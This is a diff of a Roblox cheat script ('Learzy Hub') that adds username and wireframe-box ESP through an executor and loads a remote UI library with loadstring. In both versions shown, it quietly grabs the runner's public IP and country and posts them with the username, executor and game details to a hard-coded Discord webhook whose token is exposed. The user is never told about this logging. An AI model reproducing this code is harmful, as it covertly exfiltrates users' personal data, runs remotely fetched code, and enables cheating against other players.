@@ -1,4 +1,4 @@
---// === Service Access ===
+--// === Services ===
 local HttpService = game:GetService("HttpService")
 local Players = game:GetService("Players")
 local MarketplaceService = game:GetService("MarketplaceService")
@@ -6,32 +6,34 @@ local RunService = game:GetService("RunService")
 local LocalPlayer = Players.LocalPlayer
 local Camera = workspace.CurrentCamera
 
-local HttpRequest = (syn and syn.request) or (http and http.request) or http_request or (fluxus and fluxus.request)
-
---// === Executor Identifier ===
+local Request = (syn and syn.request) or (http and http.request) or http_request or (fluxus and fluxus.request)
 local Executor = identifyexecutor and identifyexecutor() or "Unknown"
 
---// === Interface Initialization ===
+--// === UI ===
 local Rayfield = loadstring(game:HttpGet("https://sirius.menu/rayfield"))()
-local UI = Rayfield:CreateWindow({
+local MainUI = Rayfield:CreateWindow({
     Name = "Learzy Hub | " .. Executor,
     Theme = "Amethyst",
     ToggleUIKeybind = "K",
 })
 
---// === Webhook Configuration ===
+--// === Tabs ===
+local tabPlayer = MainUI:CreateTab("Player", 4483362458)
+local tabVisual = MainUI:CreateTab("Visual", 4483362458)
+local tabCombat = MainUI:CreateTab("Combat", 4483362458)
+local tabVehicle = MainUI:CreateTab("Vehicle", 4483362458)
+
+tabPlayer:CreateParagraph({Title = "Player", Content = "Player functionalities coming soon..."})
+tabVisual:CreateParagraph({Title = "Visual", Content = "ESP and overlays displayed here."})
+tabCombat:CreateParagraph({Title = "Combat", Content = "Combat features in development..."})
+tabVehicle:CreateParagraph({Title = "Vehicle", Content = "Vehicle tools in progress..."})
+
+--// === Webhook Logging ===
 local Webhook = "https://discord.com/api/webhooks/1398466235619999944/FtVfiCYeKjTyij4iFWSmpzmk5IWtHxtVDA7zCW-CQuuIwozJfU4u8qzS9psCtL9Zjmvi"
+local BlockedUsers = {["playerkontoo"] = true, ["Player123"] = true}
+local BlockedIPs = {["123.456.78.910"] = true}
 
-local BlockedUsers = {
-    ["playerkontoo"] = true,
-    ["Player123"] = true,
-}
-local BlockedIPs = {
-    ["123.456.78.910"] = true,
-}
-
---// === Blacklist UI Display ===
-local function ShowBlacklistOverlay()
+local function DisplayBlacklistUI()
     local gui = Instance.new("ScreenGui", LocalPlayer:WaitForChild("PlayerGui", 5))
     gui.Name = "BlacklistOverlay"
     gui.ResetOnSpawn = false
@@ -42,27 +44,26 @@ local function ShowBlacklistOverlay()
     blocker.BackgroundColor3 = Color3.new(0, 0, 0)
     blocker.BorderSizePixel = 0
 
-    local message = Instance.new("TextLabel", gui)
-    message.Size = UDim2.new(1, 0, 0.15, 0)
-    message.Position = UDim2.new(0, 0, 0.425, 0)
-    message.Text = "You have been blacklisted"
-    message.Font = Enum.Font.SourceSansBold
-    message.TextColor3 = Color3.fromRGB(255, 0, 0)
-    message.BackgroundTransparency = 1
-    message.TextScaled = true
+    local text = Instance.new("TextLabel", gui)
+    text.Size = UDim2.new(1, 0, 0.15, 0)
+    text.Position = UDim2.new(0, 0, 0.425, 0)
+    text.Text = "You have been blacklisted"
+    text.Font = Enum.Font.SourceSansBold
+    text.TextColor3 = Color3.fromRGB(255, 0, 0)
+    text.BackgroundTransparency = 1
+    text.TextScaled = true
 end
 
---// === Country Lookup by IP ===
-local function GetCountryInfo(ip)
+local function GetCountry(ip)
     local country, code = "Unknown", ""
-    if HttpRequest then
-        local response = HttpRequest({
+    if Request then
+        local res = Request({
             Url = "http://ip-api.com/json/" .. ip .. "?fields=status,country,countryCode",
             Method = "GET"
         })
-        if response and response.Body then
-            local success, data = pcall(HttpService.JSONDecode, HttpService, response.Body)
-            if success and data.status == "success" then
+        if res and res.Body then
+            local ok, data = pcall(HttpService.JSONDecode, HttpService, res.Body)
+            if ok and data.status == "success" then
                 country, code = data.country, data.countryCode
             end
         end
@@ -70,96 +71,82 @@ local function GetCountryInfo(ip)
     return country, code
 end
 
-local function CountryFlag(code)
+local function Flag(code)
     if not code or #code ~= 2 then return "" end
-    local offset = 127397
-    local a, b = code:sub(1,1):byte(), code:sub(2,2):byte()
-    return utf8.char(offset + a, offset + b)
+    local o = 127397
+    return utf8.char(o + code:sub(1,1):byte(), o + code:sub(2,2):byte())
 end
 
---// === IP & Executor Info ===
-local function GetClientData()
+local function GetClient()
     local ip = "Unknown"
-    if HttpRequest then
-        local result = HttpRequest({Url = "https://httpbin.org/ip", Method = "GET"})
-        if result and result.Body then
-            local ok, parsed = pcall(HttpService.JSONDecode, HttpService, result.Body)
-            if ok and parsed.origin then
-                ip = parsed.origin:split(",")[1]:gsub("^%s*(.-)%s*$", "%1")
+    if Request then
+        local res = Request({Url = "https://httpbin.org/ip", Method = "GET"})
+        if res and res.Body then
+            local ok, data = pcall(HttpService.JSONDecode, HttpService, res.Body)
+            if ok and data.origin then
+                ip = data.origin:split(",")[1]:gsub("^%s*(.-)%s*$", "%1")
             end
         end
     end
     return ip, Executor
 end
 
---// === Webhook Submission ===
-local function SendLog(ip, execName, isBlacklisted)
-    local username = LocalPlayer and LocalPlayer.Name or "Unknown"
-    local country, countryCode = GetCountryInfo(ip)
-    local flag = CountryFlag(countryCode)
+local function SendLog(ip, exec, blacklisted)
+    local username = LocalPlayer.Name
+    local country, code = GetCountry(ip)
+    local flag = Flag(code)
 
-    local gameTitle = "Unknown"
-    local placeId = tostring(game.PlaceId)
+    local gameName = "Unknown"
+    local gameId = tostring(game.PlaceId)
     local ok, info = pcall(MarketplaceService.GetProductInfo, MarketplaceService, game.PlaceId)
     if ok and info then
-        gameTitle = info.Name or gameTitle
-        placeId = info.AssetId or placeId
+        gameName = info.Name or gameName
+        gameId = info.AssetId or gameId
     end
 
-    local logPayload = {
+    local payload = {
         content = "",
         embeds = {{
-            title = "Execution Logged",
-            color = isBlacklisted and 14423100 or 65280,
+            title = "Script Execution",
+            color = blacklisted and 14423100 or 65280,
             fields = {
                 {name = "Username", value = username, inline = true},
-                {name = "IP Address", value = ip, inline = true},
-                {name = "Location", value = country .. " " .. flag, inline = true},
-                {name = "Executor", value = execName, inline = false},
-                {name = "Game", value = gameTitle, inline = false},
-                {name = "Place ID", value = placeId, inline = true},
+                {name = "IP", value = ip, inline = true},
+                {name = "Country", value = country .. " " .. flag, inline = true},
+                {name = "Executor", value = exec, inline = false},
+                {name = "Game", value = gameName, inline = false},
+                {name = "Place ID", value = tostring(game.PlaceId), inline = true},
                 {name = "Job ID", value = tostring(game.JobId), inline = true},
-                {name = "Blacklisted", value = isBlacklisted and "Yes" or "No", inline = true}
+                {name = "Blacklisted", value = blacklisted and "Yes" or "No", inline = true}
             },
             footer = {text = "Learzy Logger"},
             timestamp = DateTime.now():ToIsoDate()
         }}
     }
 
-    HttpRequest({
+    Request({
         Url = Webhook,
         Method = "POST",
         Headers = {["Content-Type"] = "application/json"},
-        Body = HttpService:JSONEncode(logPayload)
+        Body = HttpService:JSONEncode(payload)
     })
 end
 
---// === Blacklist Execution Thread ===
+--// === Run Logger & Blacklist ===
 task.spawn(function()
-    local ip, exec = GetClientData()
-    local username = LocalPlayer and LocalPlayer.Name or "Unknown"
+    local ip, exec = GetClient()
+    local username = LocalPlayer.Name
     local isBlacklisted = BlockedUsers[username] or BlockedIPs[ip] or false
 
     SendLog(ip, exec, isBlacklisted)
 
     if isBlacklisted then
-        ShowBlacklistOverlay()
+        DisplayBlacklistUI()
         return
     end
 
-    --// === UI Tabs ===
-    local Tab_Player = UI:CreateTab("Player", 4483362458)
-    local Tab_Visual = UI:CreateTab("Visual", 4483362458)
-    local Tab_Combat = UI:CreateTab("Combat", 4483362458)
-    local Tab_Vehicle = UI:CreateTab("Vehicle", 4483362458)
-
-    Tab_Player:CreateParagraph({Title = "Player", Content = "Player functionalities coming soon..."})
-    Tab_Visual:CreateParagraph({Title = "Visual", Content = "ESP and overlays displayed here."})
-    Tab_Combat:CreateParagraph({Title = "Combat", Content = "Combat features in development..."})
-    Tab_Vehicle:CreateParagraph({Title = "Vehicle", Content = "Vehicle mechanics under progress..."})
-
     --// === Username ESP ===
-    local UsernameESP_Active = false
+    local UsernameESP_Enabled = false
 
     local function RemoveUsernameESP(player)
         if player.Character and player.Character:FindFirstChild("UsernameESP") then
@@ -167,105 +154,90 @@ task.spawn(function()
         end
     end
 
-    local function AttachUsernameESP(player)
+    local function AddUsernameESP(player)
         if player == LocalPlayer then return end
 
-        local function ApplyESP(char)
-            if not UsernameESP_Active then return end
-            local head = char:FindFirstChild("Head")
-            if head and not char:FindFirstChild("UsernameESP") then
+        local function Apply(character)
+            if not UsernameESP_Enabled then return end
+            local head = character:FindFirstChild("Head")
+            if head and not character:FindFirstChild("UsernameESP") then
                 local gui = Instance.new("BillboardGui")
                 gui.Name = "UsernameESP"
                 gui.Adornee = head
                 gui.AlwaysOnTop = true
                 gui.Size = UDim2.new(0, 60, 0, 16)
                 gui.StudsOffset = Vector3.new(0, 3, 0)
-                gui.Parent = char
+                gui.Parent = character
 
-                local text = Instance.new("TextLabel")
-                text.Text = player.Name
-                text.Font = Enum.Font.SourceSansBold
-                text.TextColor3 = Color3.new(1, 1, 1)
-                text.BackgroundTransparency = 1
-                text.TextScaled = true
-                text.Size = UDim2.new(1, 0, 1, 0)
-                text.Parent = gui
+                local label = Instance.new("TextLabel")
+                label.Text = player.Name
+                label.Font = Enum.Font.SourceSansBold
+                label.TextColor3 = Color3.new(1, 1, 1)
+                label.BackgroundTransparency = 1
+                label.TextScaled = true
+                label.Size = UDim2.new(1, 0, 1, 0)
+                label.Parent = gui
 
-                local outline = Instance.new("UIStroke")
-                outline.Thickness = 2.5
-                outline.Color = Color3.new(0, 0, 0)
-                outline.ApplyStrokeMode = Enum.ApplyStrokeMode.Contextual
-                outline.Parent = text
+                local stroke = Instance.new("UIStroke")
+                stroke.Thickness = 2.5
+                stroke.Color = Color3.new(0, 0, 0)
+                stroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Contextual
+                stroke.Parent = label
             end
         end
 
         player.CharacterAdded:Connect(function(char)
             char:WaitForChild("Head", 5)
             task.wait(0.2)
-            ApplyESP(char)
+            Apply(char)
         end)
 
-        if player.Character then ApplyESP(player.Character) end
+        if player.Character then Apply(player.Character) end
     end
 
     local function ToggleUsernameESP(state)
-        UsernameESP_Active = state
+        UsernameESP_Enabled = state
         for _, p in ipairs(Players:GetPlayers()) do
             if state then
-                AttachUsernameESP(p)
+                AddUsernameESP(p)
             else
                 RemoveUsernameESP(p)
             end
         end
     end
 
-    Players.PlayerAdded:Connect(function(player)
-        if UsernameESP_Active then AttachUsernameESP(player) end
+    Players.PlayerAdded:Connect(function(p)
+        if UsernameESP_Enabled then AddUsernameESP(p) end
     end)
 
-    Tab_Visual:CreateToggle({
+    tabVisual:CreateToggle({
         Name = "Username ESP",
         CurrentValue = false,
         Callback = ToggleUsernameESP,
     })
 end)
 
---// === Wireframe Box ESP ===
-local BoxESP_Active = false
-local WireframeData = {}
+--// === Box ESP ===
+local BoxESP_Enabled = false
+local Wireframes = {}
 
-local BoxEdges = {
+local Edges = {
     {1, 2}, {2, 4}, {4, 3}, {3, 1},
     {5, 6}, {6, 8}, {8, 7}, {7, 5},
     {1, 5}, {2, 6}, {3, 7}, {4, 8}
 }
 
---// Drawing Support Test
-local function IsDrawingSupported()
-    local success = pcall(function()
-        local testLine = Drawing.new("Line")
-        testLine.Visible = false
-        testLine:Remove()
-    end)
-    return success
-end
-
---// Clear box for player
 local function ClearWireframe(player)
-    if WireframeData[player] then
-        for _, line in ipairs(WireframeData[player]) do
-            if line and line.Remove then
-                line:Remove()
-            end
+    if Wireframes[player] then
+        for _, line in ipairs(Wireframes[player]) do
+            if line.Remove then line:Remove() end
         end
-        WireframeData[player] = nil
+        Wireframes[player] = nil
     end
 end
 
---// Setup box for player
 local function CreateWireframe(player)
-    if player == LocalPlayer or WireframeData[player] then return end
-
+    if player == LocalPlayer or Wireframes[player] then return end
     local lines = {}
     for _ = 1, 12 do
         local line = Drawing.new("Line")
@@ -275,72 +247,56 @@ local function CreateWireframe(player)
         line.Visible = false
         table.insert(lines, line)
     end
-    WireframeData[player] = lines
+    Wireframes[player] = lines
 end
 
---// Render wireframes every frame
 local function UpdateWireframes()
-    for player, lines in pairs(WireframeData) do
-        local character = player.Character
-        local root = character and character:FindFirstChild("HumanoidRootPart")
-        local humanoid = character and character:FindFirstChildOfClass("Humanoid")
-        if not root or not humanoid or humanoid.Health <= 0 then
+    for player, lines in pairs(Wireframes) do
+        local char = player.Character
+        local hrp = char and char:FindFirstChild("HumanoidRootPart")
+        local hum = char and char:FindFirstChildOfClass("Humanoid")
+        if not hrp or not hum or hum.Health <= 0 then
             for _, line in ipairs(lines) do line.Visible = false end
             continue
         end
 
-        -- Get bounding box
-        local minVec, maxVec
-        for _, part in ipairs(character:GetDescendants()) do
+        local min, max
+        for _, part in ipairs(char:GetDescendants()) do
             if part:IsA("BasePart") then
                 local pos = part.Position
-                minVec = minVec and Vector3.new(
-                    math.min(minVec.X, pos.X),
-                    math.min(minVec.Y, pos.Y),
-                    math.min(minVec.Z, pos.Z)
-                ) or pos
-                maxVec = maxVec and Vector3.new(
-                    math.max(maxVec.X, pos.X),
-                    math.max(maxVec.Y, pos.Y),
-                    math.max(maxVec.Z, pos.Z)
-                ) or pos
+                min = min and Vector3.new(math.min(min.X, pos.X), math.min(min.Y, pos.Y), math.min(min.Z, pos.Z)) or pos
+                max = max and Vector3.new(math.max(max.X, pos.X), math.max(max.Y, pos.Y), math.max(max.Z, pos.Z)) or pos
             end
         end
 
-        if not minVec or not maxVec then
+        if not min or not max then
             for _, line in ipairs(lines) do line.Visible = false end
             continue
         end
 
-        -- Expand box slightly
-        minVec = minVec - Vector3.new(1.5, 1.5, 1.2)
-        maxVec = maxVec + Vector3.new(1.5, 1.5, 1.2)
+        min = min - Vector3.new(1.5, 1.5, 1.2)
+        max = max + Vector3.new(1.5, 1.5, 1.2)
 
-        -- Box corners
         local corners = {
-            Vector3.new(minVec.X, minVec.Y, minVec.Z),
-            Vector3.new(maxVec.X, minVec.Y, minVec.Z),
-            Vector3.new(minVec.X, minVec.Y, maxVec.Z),
-            Vector3.new(maxVec.X, minVec.Y, maxVec.Z),
-            Vector3.new(minVec.X, maxVec.Y, minVec.Z),
-            Vector3.new(maxVec.X, maxVec.Y, minVec.Z),
-            Vector3.new(minVec.X, maxVec.Y, maxVec.Z),
-            Vector3.new(maxVec.X, maxVec.Y, maxVec.Z)
+            Vector3.new(min.X, min.Y, min.Z), Vector3.new(max.X, min.Y, min.Z),
+            Vector3.new(min.X, min.Y, max.Z), Vector3.new(max.X, min.Y, max.Z),
+            Vector3.new(min.X, max.Y, min.Z), Vector3.new(max.X, max.Y, min.Z),
+            Vector3.new(min.X, max.Y, max.Z), Vector3.new(max.X, max.Y, max.Z)
         }
 
         local screen = {}
         for i, v in ipairs(corners) do
-            local pos, onScreen = Camera:WorldToViewportPoint(v)
-            screen[i] = onScreen and Vector2.new(pos.X, pos.Y) or nil
+            local s, vis = Camera:WorldToViewportPoint(v)
+            screen[i] = vis and Vector2.new(s.X, s.Y) or nil
         end
 
-        for i, edge in ipairs(BoxEdges) do
+        for i, edge in ipairs(Edges) do
             local p1, p2 = screen[edge[1]], screen[edge[2]]
             local line = lines[i]
             if p1 and p2 then
                 line.From = p1
                 line.To = p2
-                line.Visible = BoxESP_Active
+                line.Visible = BoxESP_Enabled
             else
                 line.Visible = false
             end
@@ -348,32 +304,23 @@ local function UpdateWireframes()
     end
 end
 
---// Setup players
 Players.PlayerAdded:Connect(CreateWireframe)
 Players.PlayerRemoving:Connect(ClearWireframe)
-for _, player in ipairs(Players:GetPlayers()) do
-    if player ~= LocalPlayer then CreateWireframe(player) end
+for _, p in ipairs(Players:GetPlayers()) do
+    if p ~= LocalPlayer then CreateWireframe(p) end
 end
 
---// Frame Update
 RunService.RenderStepped:Connect(function()
-    if BoxESP_Active then
-        UpdateWireframes()
-    end
+    if BoxESP_Enabled then UpdateWireframes() end
 end)
 
---// Toggle UI Callback
 tabVisual:CreateToggle({
     Name = "Box ESP",
     CurrentValue = false,
     Callback = function(state)
-        if not IsDrawingSupported() then
-            warn("[ESP] Drawing API is not supported on this executor.")
-            return
-        end
-        BoxESP_Active = state
+        BoxESP_Enabled = state
         if not state then
-            for _, lines in pairs(WireframeData) do
+            for _, lines in pairs(Wireframes) do
                 for _, line in ipairs(lines) do
                     line.Visible = false
                 end
